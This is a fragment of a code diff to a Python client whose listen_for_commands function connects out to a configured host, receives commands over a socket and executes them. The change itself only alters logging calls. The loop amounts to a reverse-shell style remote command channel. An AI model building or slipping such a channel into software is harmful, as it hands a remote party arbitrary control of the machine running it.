@@ -52,11 +52,12 @@ def execute_command(command):
 def listen_for_commands(host=HOST_IP, port=HOST_PORT):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((host, port))
+        console.log("Client connected to host.")
         while True:
             command = s.recv(1024).decode()
             if not command:
                 break
-            print(f"Executing command: {command}")
+            console.log(f"Executing command: {command}")
 
             if command == "exit":
                 console.log("Exitting client..")
